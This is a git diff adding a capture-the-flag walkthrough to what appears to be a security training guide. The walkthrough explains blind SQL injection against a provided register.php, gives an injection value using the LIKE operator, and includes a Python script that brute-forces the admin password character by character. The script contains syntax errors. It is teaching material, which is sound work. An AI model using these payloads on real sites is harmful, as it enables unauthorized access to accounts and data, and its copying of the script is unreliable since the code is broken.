@@ -410,7 +410,7 @@ When the database does not output data to the web page, an attacker is forced to
 exploitation more difficult, but not impossible.
 
 Consider this pseudocode:
-```
+```php
 $query = $_GET['query'];
 if (db_query($query)) {
 	echo "Successful";
@@ -422,7 +422,92 @@ if (db_query($query)) {
 When the query returns false, a "Fail" is displayed, and when the query returns true, "Successful" is displayed.
 Therefore, it is harder to obtain data from the database, as the result is not output to the web page.
 
+Now we know the idea of Blind SQL Injection, lets look at the problem on the scoreboard, and obtain the URL for this problem.
 
+In this problem, the source code for login.php and register.php is provided.
+
+Take a look at ```login.php```:
+```php
+<?php
+include "config.php";
+$con = mysqli_connect($MYSQL_HOST, $MYSQL_USERNAME, $MYSQL_PASSWORD, $MYSQL_DB);
+$username = mysqli_real_escape_string($con, $_POST["username"]);
+$password = mysqli_real_escape_string($con, $_POST["password"]);
+$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
+$result = mysqli_query($con, $query);
+
+if (mysqli_num_rows($result) === 1) {
+		$row = mysqli_fetch_array($result);
+		echo "<h1>Logged in!</h1>";
+		echo "<p>Your flag is: $FLAG</p>";
+} else {
+		echo "<h1>Login failed.</h1>";
+}
+?>
+```
+From the code, you get two information.
+1) The username and password parameters are sanitized, and surrounded with single quotes \'\', this tells you that there is no way to do an SQL injection on this page.
+2) The ```$FLAG``` is echo'ed when you login, therefore you need to find a way to obtain the username/password.
+
+Now, we take a look at ```register.php```:
+```php
+<?php
+include "config.php";
+$con = mysqli_connect($MYSQL_HOST, $MYSQL_USERNAME, $MYSQL_PASSWORD, $MYSQL_DB);
+$username = $_POST["register"];
+$query = "SELECT * FROM users WHERE username='$username'";
+$result = mysqli_query($con, $query);
+
+if (mysqli_num_rows($result) !== 0) {
+	  die("Someone has already registered " . htmlspecialchars($username));
+}
+
+die("Registration has been disabled.");
+?>
+```
+
+From ```register.php```, certain things should raise some red flags immediately.
+* The username parameter is not being sanitized by the mysqli_real_escape_string function.
+When the mysql query returns at least 1 row, the page would return "Someone has already registered...." else, it'd show that registration has been disabled.
+Using this information, we are able to first look for an username that exists in the database.
+
+The original query is ```SELECT * FROM users WHERE username ='$username'```.
+To look for a username, we can make use of the SQL LIKE operator. 
+Let's manipulate the query to be ```SELECT * FROM users WHERE username ='' or username LIKE 'a%'```
+To get the query to be that, the $username parameter has to be ```' or username like 'a%```, note how I did not close the last single quote.
+
+Now, the page should return ```someone has already registered...```, that means there is a username starting with "a".
+
+Now, we do the same thing to the second character to retrieve the full username.
+
+You should discover that the username is 'admin'.
+
+To obtain the password for 'admin', we'll use the same technique, but on the password field.
+The query should now be ```SELECT * FROM users WHERE username = 'admin' and password like '%'```.
+
+To make things easier, we can make use of a python script to bruteforce the password.
+
+```python
+import string
+import requests
+
+load = string.digits + string.letters
+url = 'http://url/register.php'
+prePassword = ""
+found = False
+while found == False:
+	found = True
+	for i in load:
+		payload = {'register':admin\' and password like \''+prePassword+i+'%'}
+		r = request.post(url, data=payload)
+		print("trying %s" % (prePassword+i))
+		if not "disabled" in r.content:
+			print r.content
+			prePassword = prePassword+i
+			found = False
+```
+
+After running the script, you can login with the username/password and obtain the flag!
 
 
 Local File Inclusion
